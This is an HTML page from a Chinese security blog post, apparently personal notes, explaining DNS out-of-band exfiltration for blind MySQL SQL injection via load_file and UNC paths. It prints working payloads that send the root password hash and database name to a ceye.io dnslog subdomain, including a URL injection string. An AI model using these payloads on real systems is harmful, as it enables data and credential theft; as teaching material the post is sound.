@@ -1,0 +1,306 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head><meta name="generator" content="Hexo 3.8.0">
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
+    <meta name="description" content="dns注入的使用场景：在某些无法直接利用注入漏洞获得回显的情况下，但目标还是可以发起dns请求，这个时候我们就可以通过dns解析把获得的数据外带出去。 对于sql盲注通常是使用二分法去一步步猜，但是此方法繁琐不说，而且因为不断向服务器发送数据请求，而导致被ban，所以我们可以通过select到的数据发送到一个url上，利用dns解析产生的记录日志来查看数据； dns使用函数解析： load_fil">
+<meta property="og:type" content="article">
+<meta property="og:title" content="mysql-dns注入">
+<meta property="og:url" content="http://allblue147.github.io/2019/12/07/sql-dnslog/index.html">
+<meta property="og:site_name" content="ALL BLUE">
+<meta property="og:description" content="dns注入的使用场景：在某些无法直接利用注入漏洞获得回显的情况下，但目标还是可以发起dns请求，这个时候我们就可以通过dns解析把获得的数据外带出去。 对于sql盲注通常是使用二分法去一步步猜，但是此方法繁琐不说，而且因为不断向服务器发送数据请求，而导致被ban，所以我们可以通过select到的数据发送到一个url上，利用dns解析产生的记录日志来查看数据； dns使用函数解析： load_fil">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/jP2FMP6IcA.s0t78L8v1AAEErEAqFFyX3mGTVvy9g8Y!/b/dL4AAAAAAAAA&bo=lAOBAAAAAAADBzQ!&rf=viewer_4">
+<meta property="og:updated_time" content="2019-12-06T17:50:54.003Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="mysql-dns注入">
+<meta name="twitter:description" content="dns注入的使用场景：在某些无法直接利用注入漏洞获得回显的情况下，但目标还是可以发起dns请求，这个时候我们就可以通过dns解析把获得的数据外带出去。 对于sql盲注通常是使用二分法去一步步猜，但是此方法繁琐不说，而且因为不断向服务器发送数据请求，而导致被ban，所以我们可以通过select到的数据发送到一个url上，利用dns解析产生的记录日志来查看数据； dns使用函数解析： load_fil">
+<meta name="twitter:image" content="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/jP2FMP6IcA.s0t78L8v1AAEErEAqFFyX3mGTVvy9g8Y!/b/dL4AAAAAAAAA&bo=lAOBAAAAAAADBzQ!&rf=viewer_4">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>mysql-dns注入</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" "top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+        
+      </ul>
+    </span>
+    <br>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇 " href="/2019/12/07/sql1/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇 " href="/2019/12/07/PHPOK 4.7从注入到getshell/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部 " href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章 " href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://allblue147.github.io/2019/12/07/sql-dnslog/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://allblue147.github.io/2019/12/07/sql-dnslog/&text=mysql-dns注入"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://allblue147.github.io/2019/12/07/sql-dnslog/&title=mysql-dns注入"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://allblue147.github.io/2019/12/07/sql-dnslog/&is_video=false&description=mysql-dns注入"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=mysql-dns注入&body=Check out this article: http://allblue147.github.io/2019/12/07/sql-dnslog/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://allblue147.github.io/2019/12/07/sql-dnslog/&title=mysql-dns注入"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://allblue147.github.io/2019/12/07/sql-dnslog/&title=mysql-dns注入"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://allblue147.github.io/2019/12/07/sql-dnslog/&title=mysql-dns注入"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://allblue147.github.io/2019/12/07/sql-dnslog/&title=mysql-dns注入"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://allblue147.github.io/2019/12/07/sql-dnslog/&name=mysql-dns注入&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://allblue147.github.io/2019/12/07/sql-dnslog/&t=mysql-dns注入"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#dns注入的使用场景："><span class="toc-number">1.</span> <span class="toc-text">dns注入的使用场景：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#dns使用函数解析："><span class="toc-number">2.</span> <span class="toc-text">dns使用函数解析：</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        mysql-dns注入
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">JYP</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2019-12-06T17:03:10.433Z" itemprop="datePublished">2019-12-07</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/笔记/">笔记</a>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="dns注入的使用场景："><a href="#dns注入的使用场景：" class="headerlink" title="dns注入的使用场景："></a>dns注入的使用场景：</h2><p>在某些无法直接利用注入漏洞获得回显的情况下，但目标还是可以发起dns请求，这个时候我们就可以通过dns解析把获得的数据外带出去。</p>
+<p>对于sql盲注通常是使用二分法去一步步猜，但是此方法繁琐不说，而且因为不断向服务器发送数据请求，而导致被ban，所以我们可以通过select<br>到的数据发送到一个url上，利用dns解析产生的记录日志来查看数据；</p>
+<h2 id="dns使用函数解析："><a href="#dns使用函数解析：" class="headerlink" title="dns使用函数解析："></a>dns使用函数解析：</h2><ul>
+<li><strong>load_file:</strong></li>
+</ul>
+<p>这是一个用来读取文件的函数（必须是root权限），读取文件并返回文件内容为字符串。要使用此函数，文件<strong>必须位于服务器主机上</strong>，必须<strong>指定完整路径的文件</strong>，而且<strong>必须有FILE权限</strong>。 该文件所有字节可读，但文件内容必须小于max_allowed_packetx(限制server接收数据包大小函数，默认是1MB)。<br>如果<strong>该文件不存在或无法读取，因为前面的条件之一不满足，函数返回 NULL。</strong><br>在MySQL5.0.19，character_set_filesystem系统变量控制文件名的解释，即仅作文字字符串。</p>
+<hr>
+<p><a href="http://ceye.io是一个免费的dnslog平台，（里面提供了如何操作和注入paylod）" target="_blank" rel="noopener">http://ceye.io是一个免费的dnslog平台，（里面提供了如何操作和注入paylod）</a></p>
+<p>平台所给出的payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT LOAD_FILE(CONCAT(&apos;\\\\&apos;,(SELECT password FROM mysql.user WHERE user=&apos;root&apos; LIMIT 1),&apos;.yluzfg.ceye.io\\abc&apos;));</span><br></pre></td></tr></table></figure></p>
+<p>执行之后:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(&apos;\\root.yluzfg.ceye.io\abc&apos;)</span><br></pre></td></tr></table></figure>
+<p>concat其实我们已经了解过了，通过他来拼接字符串。<br>而前面的\将后面的\转义了，所以只剩下两个’\’</p>
+<p>而\开头加上网络路径正好形成了一个unc路径，这种也叫UNC路径访问法<br>通过命令去访问网上邻居。</p>
+<p>实际上这句语句是数据库执行去访问root.yluzfg.ceye.io的共享文件夹abc，而ceye.io的子域名解析都是在某些服务器，然后记录了有人请求访问了root.yluzfg.ceye.io，然后通过日志在ceye这个平台上面显示出来了。</p>
+<p>我们可以通过构造payloads来通过dns解析产生的记录日志并传到yece.io查询我们需要的信息：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and (select load_file(concat(&apos;\\\\&apos;,(select database()),&apos;.xxxxx.ceye.io\\abc&apos;)))#</span><br></pre></td></tr></table></figure>
+<p>在通过ceye去查看我们所爆出的信息；<br><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/jP2FMP6IcA.s0t78L8v1AAEErEAqFFyX3mGTVvy9g8Y!/b/dL4AAAAAAAAA&amp;bo=lAOBAAAAAAADBzQ!&amp;rf=viewer_4" alt></p>
+<p>就这样，通过一步步爆出数据库、表、字段等关键信息，对于有多个值，我们也可以通过移动偏移去一个个查看；</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#dns注入的使用场景："><span class="toc-number">1.</span> <span class="toc-text">dns注入的使用场景：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#dns使用函数解析："><span class="toc-number">2.</span> <span class="toc-text">dns使用函数解析：</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://allblue147.github.io/2019/12/07/sql-dnslog/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://allblue147.github.io/2019/12/07/sql-dnslog/&text=mysql-dns注入"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://allblue147.github.io/2019/12/07/sql-dnslog/&title=mysql-dns注入"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://allblue147.github.io/2019/12/07/sql-dnslog/&is_video=false&description=mysql-dns注入"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=mysql-dns注入&body=Check out this article: http://allblue147.github.io/2019/12/07/sql-dnslog/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://allblue147.github.io/2019/12/07/sql-dnslog/&title=mysql-dns注入"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://allblue147.github.io/2019/12/07/sql-dnslog/&title=mysql-dns注入"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://allblue147.github.io/2019/12/07/sql-dnslog/&title=mysql-dns注入"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://allblue147.github.io/2019/12/07/sql-dnslog/&title=mysql-dns注入"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://allblue147.github.io/2019/12/07/sql-dnslog/&name=mysql-dns注入&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://allblue147.github.io/2019/12/07/sql-dnslog/&t=mysql-dns注入"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2021
+    JYP
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'">
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+
+<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
